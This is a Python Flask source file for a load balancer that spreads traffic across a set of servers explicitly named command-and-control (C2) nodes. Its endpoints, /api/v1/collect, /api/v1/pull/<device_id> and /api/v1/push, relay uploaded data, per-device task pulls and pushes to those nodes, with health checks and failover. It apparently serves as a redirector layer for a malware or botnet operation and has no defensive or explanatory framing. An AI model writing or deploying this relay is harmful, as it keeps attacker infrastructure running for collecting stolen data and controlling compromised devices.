import os
import time
import random
import logging
import threading
from typing import List, Dict, Optional
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("LoadBalancer")

app = Flask(__name__)

C2_SERVERS = os.environ.get('C2_SERVERS', 'http://c2-node-1:5000,http://c2-node-2:5000,http://c2-node-3:5000').split(',')
HEALTH_CHECK_INTERVAL = int(os.environ.get('HEALTH_CHECK_INTERVAL', 30))
LOAD_BALANCE_ALGORITHM = os.environ.get('LOAD_BALANCE_ALGORITHM', 'round_robin')
MAX_RETRIES = int(os.environ.get('MAX_RETRIES', 3))
RETRY_DELAY = int(os.environ.get('RETRY_DELAY', 5))

server_health = {server: {'healthy': True, 'connections': 0, 'last_check': 0} for server in C2_SERVERS}
round_robin_index = 0

def check_server_health(server: str) -> bool:
    try:
        import requests
        response = requests.get(f"{server}/health", timeout=5)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Health check failed for {server}: {e}")
        return False

def update_server_health():
    global server_health
    for server in C2_SERVERS:
        server_health[server]['healthy'] = check_server_health(server)
        server_health[server]['last_check'] = time.time()

def get_healthy_servers() -> List[str]:
    return [s for s in C2_SERVERS if server_health.get(s, {}).get('healthy', False)]

def select_server_round_robin() -> Optional[str]:
    global round_robin_index
    healthy = get_healthy_servers()
    if not healthy:
        return None
    index = round_robin_index % len(healthy)
    round_robin_index += 1
    return healthy[index]

def select_server_random() -> Optional[str]:
    healthy = get_healthy_servers()
    return random.choice(healthy) if healthy else None

def select_server_least_connections() -> Optional[str]:
    healthy = get_healthy_servers()
    if not healthy:
        return None
    min_conn = min(server_health[s]['connections'] for s in healthy)
    candidates = [s for s in healthy if server_health[s]['connections'] == min_conn]
    return random.choice(candidates)

def select_server() -> Optional[str]:
    algo = LOAD_BALANCE_ALGORITHM.lower()
    if algo == 'round_robin':
        return select_server_round_robin()
    elif algo == 'random':
        return select_server_random()
    elif algo == 'least_connections':
        return select_server_least_connections()
    else:
        return select_server_round_robin()

def forward_request(server: str, method: str, path: str, data: Optional[Dict] = None):
    import requests
    url = f"{server}{path}"
    headers = {k: v for k, v in request.headers.items() if k.lower() != 'host'}
    try:
        server_health[server]['connections'] += 1
        response = requests.request(
            method=method,
            url=url,
            headers=headers,
            json=data if data else None,
            data=request.get_data() if not data else None,
            cookies=request.cookies,
            timeout=30,
            allow_redirects=False
        )
        return response
    except Exception as e:
        logger.error(f"Error forwarding to {server}: {e}")
        raise
    finally:
        server_health[server]['connections'] -= 1

@app.before_request
def before_request():
    if random.random() < 0.01:
        update_server_health()

@app.route('/api/v1/collect', methods=['POST'])
def collect():
    server = select_server()
    if not server:
        return jsonify({"error": "Service unavailable"}), 503
    try:
        resp = forward_request(server, 'POST', '/api/v1/collect', request.get_json())
        return (resp.content, resp.status_code, resp.headers.items())
    except Exception as e:
        logger.error(f"Failed to forward to {server}: {e}")
        server = select_server()
        if server:
            try:
                resp = forward_request(server, 'POST', '/api/v1/collect', request.get_json())
                return (resp.content, resp.status_code, resp.headers.items())
            except:
                pass
        return jsonify({"error": "Service unavailable"}), 503

@app.route('/api/v1/pull/<device_id>', methods=['GET'])
def pull(device_id):
    server = select_server()
    if not server:
        return jsonify({"error": "Service unavailable"}), 503
    try:
        resp = forward_request(server, 'GET', f'/api/v1/pull/{device_id}')
        return (resp.content, resp.status_code, resp.headers.items())
    except Exception as e:
        logger.error(f"Failed to forward to {server}: {e}")
        return jsonify({"error": "Service unavailable"}), 503

@app.route('/api/v1/push', methods=['POST'])
def push():
    server = select_server()
    if not server:
        return jsonify({"error": "Service unavailable"}), 503
    try:
        resp = forward_request(server, 'POST', '/api/v1/push', request.get_json())
        return (resp.content, resp.status_code, resp.headers.items())
    except Exception as e:
        logger.error(f"Failed to forward to {server}: {e}")
        return jsonify({"error": "Service unavailable"}), 503

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy", "servers": server_health}), 200

if __name__ == '__main__':
    update_server_health()
    def health_checker():
        while True:
            time.sleep(HEALTH_CHECK_INTERVAL)
            update_server_health()
    threading.Thread(target=health_checker, daemon=True).start()
    port = int(os.environ.get('LOAD_BALANCER_PORT', 80))
    app.run(host='0.0.0.0', port=port)